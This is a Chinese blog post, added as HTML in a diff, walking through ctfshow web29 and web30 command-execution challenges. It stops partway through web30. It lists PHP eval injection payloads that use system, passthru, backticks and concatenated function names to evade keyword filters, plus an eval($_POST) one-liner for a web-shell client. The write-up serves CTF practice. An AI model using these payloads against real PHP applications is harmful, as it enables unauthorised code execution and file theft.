@@ -1,0 +1,666 @@
+<!doctype html>
+<html lang="zh"><head>
+<title>爆破-web29 - X8@0E的博客</title>
+<meta charset="UTF-8">
+<meta name="keywords" content="">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
+
+<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon" />
+<meta name="description" content="web29 典型的 Web Shell 或代码执行漏洞 的示例代码功能解析 error_reporting(0) 关闭所有 PHP 错误提示，防止泄露敏感信息。   if(isset($_GET[‘c’])) 检查是否存在 GET 参数 c（例如：?c&#x3D;命令）。   preg_match(“&#x2F;flag&#x2F;i”, $c) 使用 preg_match() 函数对 $c 变量">
+<meta property="og:type" content="article">
+<meta property="og:title" content="爆破-web29">
+<meta property="og:url" content="http://example.com/2025/07/29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-web29/index.html">
+<meta property="og:site_name" content="X8@0E的博客">
+<meta property="og:description" content="web29 典型的 Web Shell 或代码执行漏洞 的示例代码功能解析 error_reporting(0) 关闭所有 PHP 错误提示，防止泄露敏感信息。   if(isset($_GET[‘c’])) 检查是否存在 GET 参数 c（例如：?c&#x3D;命令）。   preg_match(“&#x2F;flag&#x2F;i”, $c) 使用 preg_match() 函数对 $c 变量">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250729193721985.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250729193434845.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250729193517329.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250729194044745.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250730205439843.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250730205739145.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250730205804564.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250730205814787.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250729200838887.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250729202218989.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250729202252345.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250729202326671.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250729202436777.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250729202710673.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250729203413032.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250729203726973.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250729204652153.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250729205049846.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250729205715407.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250729210258347.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250729210455082.png">
+<meta property="article:published_time" content="2025-07-29T09:11:19.052Z">
+<meta property="article:modified_time" content="2025-07-31T02:45:09.640Z">
+<meta property="article:author" content="X8@0E">
+<meta property="article:tag" content="ctfshow">
+<meta property="article:tag" content="web命令执行">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250729193721985.png">
+
+<link rel="stylesheet" href="/lib/fancybox/fancybox.css">
+<link rel="stylesheet" href="/lib/mdui_043tiny/mdui.css">
+
+
+<link rel="stylesheet" href="/lib/iconfont/iconfont.css?v=1761989925423">
+
+<link rel="stylesheet" href="/css/style.css?v=1761989925423">
+
+
+
+
+    
+        <link rel="stylesheet" href="/custom.css?v=1761989925423">
+    
+
+
+
+<script src="/lib/mdui_043tiny/mdui.js" async></script>
+<script src="/lib/fancybox/fancybox.umd.js" async></script>
+<script src="/lib/lax.min.js" async></script>
+
+
+<script async src="/js/app.js?v=1761989925423"></script>
+
+ 
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-4D4ZJ9G024"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag("js", new Date());
+
+  gtag("config", "G-4D4ZJ9G024");
+</script>
+
+
+<link rel="stylesheet"  href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/atom-one-dark.min.css">
+<meta name="generator" content="Hexo 7.3.0"></head><body class="nexmoe mdui-drawer-body-left"><div id="nexmoe-background"><div class="nexmoe-bg" style="background-image: url(https://img-baofun.zhhainiao.com/pcwallpaper_ugc/static/55f0c32a6a773efe8c6a6a8158a06f18.jpg?x-oss-process=image%2fresize%2cm_lfit%2cw_1920%2ch_1080)"></div><div class="mdui-appbar mdui-shadow-0"><div class="mdui-toolbar"><a class="mdui-btn mdui-btn-icon mdui-ripple" mdui-drawer="{target: &#039;#drawer&#039;, swipe: true}" title="menu"><i class="mdui-icon nexmoefont icon-menu"></i></a><div class="mdui-toolbar-spacer"></div><a class="mdui-btn mdui-btn-icon" href="/" title="X8@0E"><img src="https://n.sinaimg.cn/sinakd20119/560/w1080h1080/20220924/802a-0c9750f1fa5aa25624c0847a082aaba1.jpg" alt="X8@0E"></a></div></div></div><div id="nexmoe-header"><div class="nexmoe-drawer mdui-drawer" id="drawer">
+    <div class="nexmoe-avatar mdui-ripple">
+        <a href="/" title="X8@0E">
+            <img src="https://n.sinaimg.cn/sinakd20119/560/w1080h1080/20220924/802a-0c9750f1fa5aa25624c0847a082aaba1.jpg" alt="X8@0E" alt="X8@0E">
+        </a>
+    </div>
+    <div class="nexmoe-count">
+        <div><span>文章</span>43</div>
+        <div><span>标签</span>77</div>
+        <div><span>分类</span>14</div>
+    </div>
+    <div class="nexmoe-list mdui-list" mdui-collapse="{accordion: true}">
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/" title="回到首页">
+            <i class="mdui-list-item-icon nexmoefont icon-home"></i>
+            <div class="mdui-list-item-content">
+                回到首页
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/archives.html" title="文章归档">
+            <i class="mdui-list-item-icon nexmoefont icon-douban-fill"></i>
+            <div class="mdui-list-item-content">
+                文章归档
+            </div>
+        </a>
+        
+    </div>
+    
+    
+        
+        <div class="nexmoe-widget-wrap">
+    <div class="nexmoe-widget nexmoe-search">
+        
+            <form id="search_form">
+                <label><input class="st-default-search-input" id="search_value" name="q" type="search" placeholder="搜索" style="
+                    font-size: 15px !important;
+                    height: 56px !important;
+                    background-image: none;
+                "></label>
+            </form>
+         
+    </div>
+</div>
+
+
+	<script async src="/js/search.js?v=1761989925424"></script>
+
+
+
+    
+        
+        <div class="nexmoe-widget-wrap">
+	<div class="nexmoe-widget nexmoe-social">
+		<a
+			class="mdui-ripple"
+			href="https://blog.csdn.net/2301_81325456/article/details/147025965"
+			target="_blank"
+			mdui-tooltip="{content: 'CSDN'}"
+			style="
+				color: rgb(247, 132, 34);
+				background-color: rgba(247, 132, 34, .1);
+			"
+		>
+			<i
+				class="nexmoefont icon-github"
+			></i> </a
+		>
+	</div>
+</div>
+
+    
+        
+        
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">文章分类</h3>
+    <div class="nexmoe-widget">
+
+      <ul class="category-list">
+
+        
+
+
+        
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/Crypto/">Crypto</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/NSSCTF/">NSSCTF</a>
+          <span class="category-list-count">2</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/Vulnhub/">Vulnhub</a>
+          <span class="category-list-count">3</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/Vulnvm靶机复现/">Vulnvm靶机复现</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/ctfshow-web-信息收集/">ctfshow-web-信息收集</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/ctfshow-web-命令执行/">ctfshow-web-命令执行</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/ctfshow-web-文件上传/">ctfshow-web-文件上传</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/ctfshow-web-文件包含/">ctfshow-web-文件包含</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/ctfshow-web-爆破/">ctfshow-web-爆破</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/sql注入/">sql注入</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/vulhub/">vulhub</a>
+          <span class="category-list-count">7</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/vulnhub/">vulnhub</a>
+          <span class="category-list-count">4</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/群友靶机/">群友靶机</a>
+          <span class="category-list-count">15</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/自制靶机/">自制靶机</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+      </ul>
+
+    </div>
+  </div>
+
+
+    
+        
+        
+  <div class="nexmoe-widget-wrap">
+    <div id="randomtagcloud" class="nexmoe-widget tagcloud nexmoe-rainbow">
+      <a href="/tags/1Panel/" style="font-size: 10px;">1Panel</a> <a href="/tags/3%E4%B8%AA%E7%82%B9/" style="font-size: 10px;">3个点</a> <a href="/tags/Argon2Cracker/" style="font-size: 10px;">Argon2Cracker</a> <a href="/tags/Cookie-GLOBALS/" style="font-size: 10px;">Cookie--GLOBALS</a> <a href="/tags/Cypher%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">Cypher注入</a> <a href="/tags/DC/" style="font-size: 15px;">DC</a> <a href="/tags/GIF%E7%BB%95%E8%BF%87/" style="font-size: 10px;">GIF绕过</a> <a href="/tags/Jinja2/" style="font-size: 10px;">Jinja2</a> <a href="/tags/JoomScan/" style="font-size: 10px;">JoomScan</a> <a href="/tags/LFI%E5%88%B0RCE-open%E5%87%BD%E6%95%B0/" style="font-size: 10px;">LFI到RCE(open函数)</a> <a href="/tags/NSSCTF/" style="font-size: 15px;">NSSCTF</a> <a href="/tags/Nginx%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/" style="font-size: 10px;">Nginx解析漏洞</a> <a href="/tags/RSA/" style="font-size: 10px;">RSA</a> <a href="/tags/RUNPATH/" style="font-size: 10px;">RUNPATH</a> <a href="/tags/Rabbit/" style="font-size: 10px;">Rabbit</a> <a href="/tags/SSRF/" style="font-size: 10px;">SSRF</a> <a href="/tags/Vulnhub/" style="font-size: 15px;">Vulnhub</a> <a href="/tags/Vulnvm/" style="font-size: 10px;">Vulnvm</a> <a href="/tags/WAF/" style="font-size: 10px;">WAF</a> <a href="/tags/WPA-01-cap/" style="font-size: 10px;">WPA-01.cap</a> <a href="/tags/aircrack-ng/" style="font-size: 10px;">aircrack-ng</a> <a href="/tags/basic%E8%AE%A4%E8%AF%81%E7%88%86%E7%A0%B4/" style="font-size: 10px;">basic认证爆破</a> <a href="/tags/cgi%E6%96%87%E4%BB%B6/" style="font-size: 10px;">cgi文件</a> <a href="/tags/ctfshow/" style="font-size: 20px;">ctfshow</a> <a href="/tags/dirtycow/" style="font-size: 10px;">dirtycow</a> <a href="/tags/docker%E4%BA%A4%E4%BA%92%E5%BC%8Fshell/" style="font-size: 10px;">docker交互式shell</a> <a href="/tags/drupal/" style="font-size: 10px;">drupal</a> <a href="/tags/ffuf/" style="font-size: 10px;">ffuf</a> <a href="/tags/flask/" style="font-size: 10px;">flask</a> <a href="/tags/fork%E8%A7%A3%E5%86%B3%E6%96%AD%E8%BF%9E/" style="font-size: 10px;">fork解决断连</a> <a href="/tags/ftp/" style="font-size: 10px;">ftp</a> <a href="/tags/ghfs/" style="font-size: 10px;">ghfs</a> <a href="/tags/ldd/" style="font-size: 10px;">ldd</a> <a href="/tags/les-sh/" style="font-size: 10px;">les.sh</a> <a href="/tags/linpeas-sh/" style="font-size: 10px;">linpeas.sh</a> <a href="/tags/lsattr-%E6%9F%A5%E7%9C%8B%E6%96%87%E4%BB%B6%E6%89%A9%E5%B1%95%E5%B1%9E%E6%80%A7/" style="font-size: 10px;">lsattr--查看文件扩展属性</a> <a href="/tags/motto/" style="font-size: 10px;">motto</a> <a href="/tags/msfvenom/" style="font-size: 15px;">msfvenom</a> <a href="/tags/mysql-old-password/" style="font-size: 10px;">mysql_old_password</a> <a href="/tags/nikto/" style="font-size: 10px;">nikto</a> <a href="/tags/nohup/" style="font-size: 10px;">nohup</a> <a href="/tags/php%E6%8F%90%E6%9D%83root/" style="font-size: 10px;">php提权root</a> <a href="/tags/poc/" style="font-size: 10px;">poc</a> <a href="/tags/put%E6%96%B9%E6%B3%95/" style="font-size: 10px;">put方法</a> <a href="/tags/python3-5/" style="font-size: 10px;">python3.5</a> <a href="/tags/rce/" style="font-size: 10px;">rce</a> <a href="/tags/readelf/" style="font-size: 10px;">readelf</a> <a href="/tags/scp/" style="font-size: 10px;">scp</a> <a href="/tags/sqlmap/" style="font-size: 10px;">sqlmap</a> <a href="/tags/sql%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">sql二次注入</a> <a href="/tags/ssh%E5%BC%B1%E5%8F%A3%E4%BB%A4%E7%88%86%E7%A0%B4/" style="font-size: 10px;">ssh弱口令爆破</a> <a href="/tags/ssh%E7%A7%98%E9%92%A5%E7%94%9F%E6%88%90%E8%BF%9E%E6%8E%A5/" style="font-size: 10px;">ssh秘钥生成连接</a> <a href="/tags/stegseek/" style="font-size: 10px;">stegseek</a> <a href="/tags/suForce/" style="font-size: 10px;">suForce</a> <a href="/tags/url%E6%88%AA%E6%96%AD/" style="font-size: 10px;">url截断</a> <a href="/tags/vite/" style="font-size: 10px;">vite</a> <a href="/tags/web%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" style="font-size: 10px;">web命令执行</a> <a href="/tags/web%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 10px;">web文件上传</a> <a href="/tags/web%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" style="font-size: 10px;">web文件包含</a> <a href="/tags/web%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/" style="font-size: 10px;">web源码泄露</a> <a href="/tags/web%E7%88%86%E7%A0%B4/" style="font-size: 10px;">web爆破</a> <a href="/tags/x-forwarded-for%E7%9A%84ip%E6%AC%BA%E9%AA%97/" style="font-size: 10px;">x-forwarded-for的ip欺骗</a> <a href="/tags/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-CVE-2025-30208/" style="font-size: 10px;">任意文件读取漏洞(CVE-2025-30208)</a> <a href="/tags/%E5%87%AF%E6%92%92%E5%AF%86%E7%A0%81/" style="font-size: 10px;">凯撒密码</a> <a href="/tags/%E5%90%8E%E9%9D%A2%E5%8A%A0-jpg%E5%90%8E%E7%BC%80/" style="font-size: 10px;">后面加.jpg后缀</a> <a href="/tags/%E5%9F%9F%E6%8E%A7/" style="font-size: 10px;">域控</a> <a href="/tags/%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4/" style="font-size: 10px;">密码爆破</a> <a href="/tags/%E6%8F%90%E6%9D%83-env-reset/" style="font-size: 10px;">提权!env_reset</a> <a href="/tags/%E6%8F%92%E4%BB%B6%E6%BC%8F%E6%B4%9E/" style="font-size: 10px;">插件漏洞</a> <a href="/tags/%E6%97%A5%E5%BF%97%E6%B3%A8%E5%85%A5-ua%E6%B7%BB%E5%8A%A0%E6%9C%A8%E9%A9%AC/" style="font-size: 10px;">日志注入+ua添加木马</a> <a href="/tags/%E6%AD%A3%E5%90%91shell/" style="font-size: 10px;">正向shell</a> <a href="/tags/%E7%8A%B6%E6%80%81%E7%A0%81/" style="font-size: 10px;">状态码</a> <a href="/tags/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/" style="font-size: 10px;">环境变量</a> <a href="/tags/%E7%A9%BA%E6%A0%BC/" style="font-size: 10px;">空格</a> <a href="/tags/%E7%BB%B4%E5%90%89%E5%B0%BC%E4%BA%9A%E5%AF%86%E7%A0%81/" style="font-size: 10px;">维吉尼亚密码</a> <a href="/tags/%E8%9A%81%E5%89%91/" style="font-size: 10px;">蚁剑</a> <a href="/tags/%E8%B6%8A%E7%95%8C%E8%AF%BB%E5%8F%96/" style="font-size: 10px;">越界读取</a>
+    </div>
+    
+      <script>
+        var maxTagcloud = parseInt(17);
+        var tags_length = parseInt(77);
+        var tags_arr = [];
+        for(var i = 0; i < tags_length; i++){
+          tags_arr.push(i);
+        }
+        tags_arr.sort(function (l, r) {
+          return Math.random() > 0.5 ? -1 : 1;
+        });
+        tags_arr = tags_arr.slice(0, maxTagcloud < tags_length ? tags_length - maxTagcloud : 0);
+        for(var tag_i = 0; tag_i < tags_arr.length; tag_i++){
+          document.getElementById("randomtagcloud").children[tags_arr[tag_i]].style.display = 'none';
+        }
+      </script>
+    
+  </div>
+
+    
+        
+        
+        
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">文章归档</h3>
+    <div class="nexmoe-widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/">2025</a><span class="archive-list-count">43</span></li></ul>
+    </div>
+  </div>
+
+
+
+    
+        
+        
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">最新文章</h3>
+    <div class="nexmoe-widget">
+      <ul>
+        
+          <li>
+            <a href="/2025/10/20/Crypto/">Crypto</a>
+          </li>
+        
+          <li>
+            <a href="/2025/10/11/%E6%B5%81%E9%87%8F%E6%81%B6%E6%84%8F%E6%94%BB%E5%87%BB/">流量分析恶意攻击</a>
+          </li>
+        
+          <li>
+            <a href="/2025/10/10/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/">流量分析</a>
+          </li>
+        
+          <li>
+            <a href="/2025/10/09/hackableII/">hackablell</a>
+          </li>
+        
+          <li>
+            <a href="/2025/10/07/Me-and-My-Girlfriend-1/">Me-and-My-Girlfriend-1</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+    
+        
+        <div class="nexmoe-widget-wrap">
+    <div class="nexmoe-widget nexmoe-link">
+		<ul>
+        
+            <li>
+                <a href="" target="_blank" >
+                    <img src="https://n.sinaimg.cn/sinakd20119/560/w1080h1080/20220924/802a-0c9750f1fa5aa25624c0847a082aaba1.jpg" alt="X8@0E"></img>
+                    <p>X8@0E</p>
+                </a>
+            </li>
+        
+		</ul>
+    </div>
+</div>
+<style>
+.nexmoe-widget-wrap .nexmoe-link ul li a {
+    text-align : center;
+}
+.nexmoe-widget-wrap .nexmoe-link ul li a img {
+    max-width : 100%;
+}
+.nexmoe-widget-wrap .nexmoe-link ul li a p {
+    margin: 10px 0;
+}
+</style>
+
+    
+   
+    <div class="nexmoe-copyright">
+        &copy; 2025 X8@0E
+        Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+        & <a href="https://github.com/theme-nexmoe/hexo-theme-nexmoe" target="_blank">Nexmoe</a>
+        
+    </div>
+</div><!-- .nexmoe-drawer --></div><div id="nexmoe-content"><div class="nexmoe-primary"><div class="nexmoe-post">
+  <article>
+    
+        <div class="nexmoe-post-cover absolute" style="padding-top: NaN%;"> 
+            <img src="https://cdn.svipaigc.com/bizi/2024/08/d686.jpeg" alt="爆破-web29" loading="lazy">
+            <h1>爆破-web29</h1>
+        </div>
+    
+    
+    <div class="nexmoe-post-meta">
+    <div class="nexmoe-rainbow">
+        <a class="nexmoefont icon-calendar-fill">2025年07月29日</a>
+        
+            <a class="nexmoefont icon-appstore-fill -link" href="/categories/ctfshow-web-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">ctfshow-web-命令执行</a>
+        
+        
+    </div>
+    
+    
+    
+    
+    
+</div>
+
+    <h1 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h1><p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250729193721985.png" alt="image-20250729193721985" data-caption="image-20250729193721985" loading="lazy"></p>
+<h1 id="典型的-Web-Shell-或代码执行漏洞-的示例"><a href="#典型的-Web-Shell-或代码执行漏洞-的示例" class="headerlink" title="典型的 Web Shell 或代码执行漏洞 的示例"></a>典型的 <strong>Web Shell 或代码执行漏洞</strong> 的示例</h1><h2 id="代码功能解析"><a href="#代码功能解析" class="headerlink" title="代码功能解析"></a>代码功能解析</h2><ol>
+<li>error_reporting(0)<ul>
+<li>关闭所有 PHP 错误提示，防止泄露敏感信息。</li>
+</ul>
+</li>
+<li>if(isset($_GET[‘c’]))<ul>
+<li>检查是否存在 GET 参数 c（例如：?c&#x3D;命令）。</li>
+</ul>
+</li>
+<li>preg_match(“&#x2F;flag&#x2F;i”, $c)<ul>
+<li>使用 preg_match() 函数对 $c 变量进行正则匹配。这个正则表达式检查 $c 中是否包含不区分大小写的字符串 “flag”。如果 $c 中不包含 “flag”，则继续执行后续代码。</li>
+<li>preg_match: 正则匹配 i:是正则匹配中的一个修饰符，表示不区分大小写。</li>
+</ul>
+</li>
+<li>eval($c)<ul>
+<li>执行 $c中的 PHP 代码，这是**<u>高危操作</u>**，允许攻击者执行任意代码。</li>
+<li>使用 eval() 函数执行 $c 变量中的代码。eval() 会将 $c 中的字符串作为 PHP 代码执行，这可能导致执行任意 PHP 代码，从而形成安全漏洞。</li>
+</ul>
+</li>
+<li>highlight_file(<strong>FILE</strong>)<ul>
+<li>如果没有传递 c 参数，则高亮显示当前文件的源代码。</li>
+</ul>
+</li>
+</ol>
+<h2 id="漏洞利用方式"><a href="#漏洞利用方式" class="headerlink" title="漏洞利用方式"></a>漏洞利用方式</h2><h4 id="直接执行系统命令"><a href="#直接执行系统命令" class="headerlink" title="直接执行系统命令"></a>直接执行系统命令</h4><ul>
+<li><p>通过 system()函数执行命令：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="title function_ invoke__">system</span>(<span class="string">&quot;ls&quot;</span>);          <span class="comment">// 列目录</span></span><br><span class="line">?c=<span class="title function_ invoke__">system</span>(<span class="string">&quot;cat fla*.php&quot;</span>);   <span class="comment">// flag.php在代码中被过滤掉了，所以需要使用模糊绕过 fla*.php 绕过代码过滤</span></span><br><span class="line">?c=<span class="title function_ invoke__">system</span>(<span class="string">&quot;tac fla*.php&quot;</span>); </span><br><span class="line">目前觉得因为system的参数必须是<span class="keyword">string</span>，所以用引号包裹。</span><br><span class="line">因为是以php代码形式来执行的，所以结尾必须有分号。</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p>在 Linux&#x2F;Unix 系统中，tac是一个命令行工具，它与 cat类似，但会<strong>反向输出文件内容</strong>（即从最后一行到第一行）。</p>
+<h3 id="为什么在-CTF-中用-tac？"><a href="#为什么在-CTF-中用-tac？" class="headerlink" title="为什么在 CTF 中用 tac？"></a><strong>为什么在 CTF 中用 tac？</strong></h3><ol>
+<li><p><strong>绕过防御规则</strong></p>
+<ul>
+<li>某些题目可能会监控或过滤 cat命令，但未过滤 tac。</li>
+<li>例如：?c&#x3D;system(“tac fl*”);可能绕过 preg_match(“&#x2F;cat&#x2F;i”, $c)的检测。</li>
+</ul>
+</li>
+<li><p><strong>快速查看文件末尾</strong></p>
+<ul>
+<li>如果 flag在文件末尾（如日志文件），tac可以直接看到，无需滚动屏幕。</li>
+</ul>
+</li>
+</ol>
+<p>3.如果 tac 被禁用，可以尝试其他方法（如 less、more、head、tail等）。</p>
+<h2 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h2><h3 id="1-c-system-“ls”"><a href="#1-c-system-“ls”" class="headerlink" title="1.?c&#x3D;system(“ls”);"></a>1.?c&#x3D;system(“ls”);</h3><p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250729193434845.png" alt="image-20250729193434845" data-caption="image-20250729193434845" loading="lazy"></p>
+<h3 id="2-c-system-“tac-fla-php”"><a href="#2-c-system-“tac-fla-php”" class="headerlink" title="2.?c&#x3D;system(“tac fla*.php”);"></a>2.?c&#x3D;system(“tac fla*.php”);</h3><p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250729193517329.png" alt="image-20250729193517329" data-caption="image-20250729193517329" loading="lazy"></p>
+<h3 id="3-c-system-“cat-fla-php”"><a href="#3-c-system-“cat-fla-php”" class="headerlink" title="3.?c&#x3D;system(“cat fla*.php”);"></a>3.?c&#x3D;system(“cat fla*.php”);</h3><p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250729194044745.png" alt="image-20250729194044745" data-caption="image-20250729194044745" loading="lazy"></p>
+<h3 id="4-蚁剑"><a href="#4-蚁剑" class="headerlink" title="4.蚁剑"></a>4.蚁剑</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?c=<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">222</span>]);</span><br></pre></td></tr></table></figure>
+
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250730205439843.png" alt="image-20250730205439843" data-caption="image-20250730205439843" loading="lazy"></p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250730205739145.png" alt="image-20250730205739145" data-caption="image-20250730205739145" loading="lazy"></p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250730205804564.png" alt="image-20250730205804564" data-caption="image-20250730205804564" loading="lazy"></p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250730205814787.png" alt="image-20250730205814787" data-caption="image-20250730205814787" loading="lazy"></p>
+<h2 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h2><p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250729200838887.png" alt="image-20250729200838887" data-caption="image-20250729200838887" loading="lazy"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="title function_ invoke__">passthru</span>(<span class="string">&quot;tac fla*&quot;</span>);</span><br><span class="line"></span><br><span class="line">?c=<span class="keyword">echo</span> `tac fla*`;</span><br><span class="line"></span><br><span class="line">?c=<span class="variable">$a</span>=sys;<span class="variable">$b</span>=tem;<span class="variable">$c</span>=<span class="variable">$a</span>.<span class="variable">$b</span>;<span class="variable">$c</span>(<span class="string">&quot;tac fla*&quot;</span>);</span><br><span class="line"></span><br><span class="line">?c=<span class="keyword">echo</span> <span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;tac fla*&quot;</span>);</span><br><span class="line"></span><br><span class="line">?c=<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);&amp;<span class="number">1</span>=<span class="title function_ invoke__">system</span>(<span class="string">&quot;tac flag.php&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<h3 id="1-passthru-tac-fla"><a href="#1-passthru-tac-fla" class="headerlink" title="1. passthru(&quot;tac fla\*&quot;)"></a><strong>1. <code>passthru(&quot;tac fla\*&quot;)</code></strong></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="title function_ invoke__">passthru</span>(<span class="string">&quot;tac fla*&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p><strong>功能</strong>：直接执行系统命令 <code>tac fla*</code> 并<strong>原始输出结果</strong>（适合二进制或非文本数据）。</p>
+</li>
+<li><p><strong>特点</strong>：</p>
+<ul>
+<li>类似 <code>system()</code>，但直接输出到浏览器，无需 <code>echo</code>。</li>
+<li>如果 <code>passthru</code> 未被过滤，是高效的选择。</li>
+</ul>
+</li>
+<li><p><strong>绕过场景</strong>：</p>
+<ul>
+<li><p>过滤了 <code>system</code> 但未过滤 <code>passthru</code>。</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250729202218989.png" alt="image-20250729202218989" data-caption="image-20250729202218989" loading="lazy"></p>
+</li>
+</ul>
+</li>
